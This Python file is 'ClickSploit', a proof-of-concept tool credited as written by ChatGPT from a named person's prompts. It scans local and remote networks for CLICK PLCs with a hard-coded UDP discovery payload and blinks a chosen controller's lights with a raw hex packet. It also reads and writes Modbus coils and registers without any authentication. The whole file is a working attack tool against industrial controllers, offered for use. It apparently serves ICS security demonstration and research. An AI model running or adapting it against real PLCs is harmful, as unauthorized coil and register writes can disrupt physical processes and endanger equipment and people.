#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License
#    along with this program.  If not, see <http://www.gnu.org/licenses/>.
#
#    Written by ChatGPT with prompts by Mike Holcomb (mike@mikeholcomb.com).
#
#    This POC discovers CLICK PLCs on local and remote networks, blinks ERR And 
#    RUN lights on a specific CLICK PLC, allows for reading and writing of coils and registers.

import os
import re
import socket
from scapy.all import IP, UDP, Raw, send, sniff
from pymodbus.client import ModbusTcpClient
from pymodbus.exceptions import ModbusIOException
import psutil
import sys

# Global variables for target PLC and network interface
target_PLC = None
selected_iface = None
selected_src_ip = None

# Function to validate IP addresses
def is_valid_ip(ip):
    try:
        socket.inet_aton(ip)
        return True
    except socket.error:
        return False

# Function to print the main menu
def print_menu():
    os.system('cls' if os.name == 'nt' else 'clear')
    print("ClickSploit")
    print("===========")
    print()
    if target_PLC:
        print(f"Target PLC:  {target_PLC}")
    else:
        print("Target PLC:  [Need to specify IP address]")
    print()
    if selected_iface:
        print(f"Selected Network Interface: {selected_iface} ({selected_src_ip})")
    else:
        print("Selected Network Interface: [Need to specify network interface]")
    print()
    print("0.  Specify network interface to use")
    print("1.  Scan local subnet for Click PLCs")
    print("2.  Scan remote subnet for Click PLCs")
    print("3.  Specify the target PLC IP address")
    print("4.  List PLC information")
    print("5.  Flash LED")
    print("6.  Read Coils")
    print("7.  Write Coils")
    print("8.  Read Registers")
    print("9.  Write Registers")
    print()
    print("X.  Exit")
    print()

# Function to get available network interfaces
def get_interfaces():
    interfaces = psutil.net_if_addrs()
    iface_list = []
    print()
    print("Available network interfaces:")
    for idx, iface in enumerate(interfaces):
        if addrs := interfaces.get(iface):
            for addr in addrs:
                if addr.family == socket.AF_INET:
                    print(f"{idx}: {iface} ({addr.address})")
                    iface_list.append((iface, addr.address))
                    break
    return iface_list

# Function to specify the network interface to use
def specify_network_interface():
    global selected_iface, selected_src_ip
    iface_list = get_interfaces()

    while True:
        print()
        iface_idx = input("Select the network interface to use (number): ")
        if iface_idx.isdigit() and int(iface_idx) in range(len(iface_list)):
            selected_iface, selected_src_ip = iface_list[int(iface_idx)]
            print(f"Selected network interface: {selected_iface} ({selected_src_ip})")
            break
        else:
            print("Invalid selection. Please try again.")

# Function to send UDP broadcast
def send_udp_broadcast(broadcast_ip, payload, src_port, dest_port, iface, src_ip):
    packet = IP(src=src_ip, dst=broadcast_ip) / UDP(sport=src_port, dport=dest_port) / Raw(load=payload)
    send(packet, iface=iface, verbose=0)

# Function to listen for responses
def listen_for_responses(port, iface):
    responses = []
    def udp_packet_callback(packet):
        if UDP in packet and packet[UDP].sport == port:
            ip = packet[IP].src
            responses.append(ip)
    sniff(filter=f"udp and port {port}", prn=udp_packet_callback, timeout=10, iface=iface)
    return responses

# Function to scan for PLCs
def scan_for_plcs(remote=False):
    if not selected_iface or not selected_src_ip:
        print("Network interface is not specified. Please specify a network interface first.")
        return

    if remote:
        broadcast_ip = input("Enter the broadcast IP address of the remote subnet: ").strip()
        if not is_valid_ip(broadcast_ip):
            print("Invalid IP address. Please try again.")
            return
    else:
        broadcast_ip = "255.255.255.255"

    payload = bytes.fromhex('4b4f50000100edd5040045016680')
    src_port = 2770
    dest_port = 25425

    print()
    print(f"Sending UDP broadcast packet to {broadcast_ip} using interface {selected_iface} from {selected_src_ip}...")
    send_udp_broadcast(broadcast_ip, payload, src_port, dest_port, selected_iface, selected_src_ip)

    print()
    print("Listening for responses...")
    responses = listen_for_responses(dest_port, selected_iface)

    if responses:
        print()
        print("Received responses from:")
        print("========================")
        for ip in responses:
            print(f"{ip}")
    else:
        print("No responses received.")

# Function to list PLC information
def list_plc_information():
    if target_PLC is None:
        print("Target PLC is not specified. Please specify a target PLC IP address first.")
        return

    if not selected_iface or not selected_src_ip:
        print("Network interface is not specified. Please specify a network interface first.")
        return
    
    payload_hex = '4b4f50000100edd5040045016680'
    payload = bytes.fromhex(payload_hex)

    src_port = 2770
    dest_port = 25425

    # Create a UDP socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind((selected_src_ip, src_port))

    try:
        # Send the payload
        sock.sendto(payload, (target_PLC, dest_port))
        print(f"Payload sent to {target_PLC}:{dest_port}")

        # Listen for the response
        sock.settimeout(10)  # Timeout after 10 seconds
        response, addr = sock.recvfrom(1024)
        print(f"Received response from {addr}: {response.hex()}")

        # Parse the response to extract the PLC name
        plc_name_hex = response.hex()[72:136]  # Extracting the PLC name part from the payload
        plc_name = bytes.fromhex(plc_name_hex).decode('utf-8', errors='ignore').strip()
        print(f"PLC Name: {plc_name}")
    except socket.timeout:
        print("No response received.")
    except Exception as e:
        print(f"Failed to send payload or receive response: {e}")
    finally:
        # Close the socket
        sock.close()

# Function to flash LED on the PLC
def flash_led():
    if target_PLC is None:
        print("Target PLC is not specified. Please specify a target PLC IP address first.")
        return

    if not selected_iface or not selected_src_ip:
        print("Network interface is not specified. Please specify a network interface first.")
        return
    
    payload_hex = '4b4f500001006a570e0045016643c0a864c800d07c1a5687'
    payload = bytes.fromhex(payload_hex)

    dest_port = 25425

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    try:
        sock.sendto(payload, (target_PLC, dest_port))
        print(f"Payload sent to {target_PLC}:{dest_port}")
    except Exception as e:
        print(f"Failed to send payload: {e}")
    finally:
        sock.close()

# Function to read coils from the PLC
def read_coils():
    if target_PLC is None:
        print("Target PLC is not specified. Please specify a target PLC IP address first.")
        return

    client = ModbusTcpClient(target_PLC)
    if client.connect():
        print(f"Connected to Click PLC at {target_PLC}")
        
        try:
            start_address = 0
            count = 10  # Adjust this as necessary
            response = client.read_coils(start_address, count)
            if not response.isError():
                for i in range(count):
                    print(f"Coil {start_address + i}: {response.bits[i]}")
            else:
                print("Error reading coils")
        except ModbusIOException as e:
            print(f"Modbus I/O Exception: {e}")
        except Exception as e:
            print(f"Exception: {e}")
        finally:
            client.close()
    else:
        print(f"Failed to connect to Click PLC at {target_PLC}")

# Function to update a specific coil on the PLC
def update_coil(client, address, value):
    try:
        response = client.write_coil(address, value)
        if not response.isError():
            print(f"Coil {address} updated to {value}")
        else:
            print(f"Failed to update coil {address}")
    except ModbusIOException as e:
        print(f"Modbus I/O Exception: {e}")
    except Exception as e:
        print(f"Exception: {e}")

# Function to write coils to the PLC
def write_coils():
    if target_PLC is None:
        print("Target PLC is not specified. Please specify a target PLC IP address first.")
        return

    client = ModbusTcpClient(target_PLC)
    if client.connect():
        print(f"Connected to Click PLC at {target_PLC}")
        
        try:
            address = int(input("Enter the coil address to update: "))
            value = int(input("Enter the value (0 or 1): "))
            if value not in [0, 1]:
                raise ValueError("Value must be 0 or 1")
            update_coil(client, address, bool(value))
        except ValueError as e:
            print(e)
        finally:
            client.close()
    else:
        print(f"Failed to connect to Click PLC at {target_PLC}")

# Function to read registers from the PLC
def read_registers():
    if target_PLC is None:
        print("Target PLC is not specified. Please specify a target PLC IP address first.")
        return

    client = ModbusTcpClient(target_PLC)
    if client.connect():
        print(f"Connected to Click PLC at {target_PLC}")
        
        try:
            start_address = 0
            count = 10  # Adjust this as necessary
            response = client.read_holding_registers(start_address, count)
            if not response.isError():
                for i in range(count):
                    print(f"Register {start_address + i}: {response.registers[i]}")
            else:
                print("Error reading registers")
        except ModbusIOException as e:
            print(f"Modbus I/O Exception: {e}")
        except Exception as e:
            print(f"Exception: {e}")
        finally:
            client.close()
    else:
        print(f"Failed to connect to Click PLC at {target_PLC}")

# Function to write registers to the PLC
def write_registers():
    if target_PLC is None:
        print("Target PLC is not specified. Please specify a target PLC IP address first.")
        return

    client = ModbusTcpClient(target_PLC)
    if client.connect():
        print(f"Connected to Click PLC at {target_PLC}")
        
        try:
            start_address = int(input("Enter the starting address: "))
            values = []
            count = int(input("Enter the number of registers to write: "))
            for i in range(count):
                value = int(input(f"Enter the value for register {start_address + i}: "))
                values.append(value)
            response = client.write_registers(start_address, values)
            if not response.isError():
                print("Registers written successfully")
            else:
                print("Error writing registers")
        except ModbusIOException as e:
            print(f"Modbus I/O Exception: {e}")
        except Exception as e:
            print(f"Exception: {e}")
        finally:
            client.close()
    else:
        print(f"Failed to connect to Click PLC at {target_PLC}")

# Main function to display the menu and handle user input
def main():
    global target_PLC
    while True:
        print_menu()
        choice = input("Select an option: ").strip().upper()
        
        if choice == '0':
            specify_network_interface()
        elif choice == '1':
            scan_for_plcs(remote=False)
        elif choice == '2':
            scan_for_plcs(remote=True)
        elif choice == '3':
            ip = input("Enter the IP address of the PLC: ").strip()
            if is_valid_ip(ip):
                target_PLC = ip
                print(f"Target PLC IP address set to: {target_PLC}")
            else:
                print("Invalid IP address. Please try again.")
        elif choice == '4':
            list_plc_information()
        elif choice == '5':
            flash_led()
        elif choice == '6':
            read_coils()
        elif choice == '7':
            write_coils()
        elif choice == '8':
            read_registers()
        elif choice == '9':
            write_registers()
        elif choice == 'X':
            print("Exiting...")
            break
        else:
            print("Invalid option. Please select a valid option.")
        
        input("Press Enter to continue...")

if __name__ == "__main__":
    main()
